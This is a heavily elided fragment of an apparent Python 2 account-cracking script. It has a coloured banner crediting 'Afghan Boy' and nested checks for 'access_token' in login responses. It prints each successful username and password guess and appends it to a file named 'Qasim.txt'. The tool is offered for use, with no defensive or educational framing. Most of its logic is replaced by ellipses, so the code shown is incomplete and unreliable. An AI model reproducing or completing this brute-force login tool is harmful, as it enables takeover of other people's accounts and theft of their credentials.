...
\033[1;97m @@@@@Usman##### \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;97m Code By     : Afghan Boy 

\033[1;97m Friends     : Usman, Afghan, Mohammad

\033[1;97m Telegram CH : 😐🖐️

\033[1;97m TLEGRAM GP  : 😐🖐️
\033[1;97m--------------------------------------------------
"""
#call menu
def Furqan():
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'access_token' in q:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(U❤️M_OK) ' + k + c + user + ' | ' + pass7
                                okb = open('Qasim.txt', 'a')
